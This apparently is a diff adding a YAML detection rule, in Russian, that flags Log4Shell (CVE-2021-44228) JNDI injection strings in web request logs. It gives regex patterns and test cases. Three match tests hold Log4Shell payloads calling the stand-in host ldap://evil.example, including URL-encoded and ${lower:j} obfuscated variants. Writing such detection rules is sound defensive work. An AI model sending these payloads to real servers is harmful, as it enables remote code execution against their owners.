@@ -1,0 +1,20 @@
+id: WEB-LOG4J-001
+name: Эксплойт Log4Shell (JNDI)
+description: Строка ${jndi:...} в любом месте запроса (адрес, User-Agent, Referer) — попытка удалённого выполнения кода через Log4j.
+severity: critical
+type: match
+tags: [web, rce, cve-2021-44228]
+field: raw
+transform: [unescape, url_decode, lowercase]
+patterns:
+  - '\$\{\s*jndi\s*:'
+  - '\$\{\s*\$\{\s*(lower|upper|::-|env)'
+message: 'Log4Shell с {src_ip}'
+tests:
+  match:
+    - '192.0.2.20 - - [12/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 512 "-" "${jndi:ldap://evil.example/a}"'
+    - '192.0.2.20 - - [12/Oct/2026:10:00:00 +0000] "GET /?x=%24%7Bjndi:ldap://evil.example/a%7D HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.20 - - [12/Oct/2026:10:00:00 +0000] "GET / HTTP/1.1" 200 512 "-" "${${lower:j}ndi:ldap://evil.example/a}"'
+  no_match:
+    - '192.0.2.20 - - [12/Oct/2026:10:00:00 +0000] "GET /price?currency=$ HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
+    - '192.0.2.20 - - [12/Oct/2026:10:00:00 +0000] "GET /template/${name} HTTP/1.1" 404 0 "-" "Mozilla/5.0"'
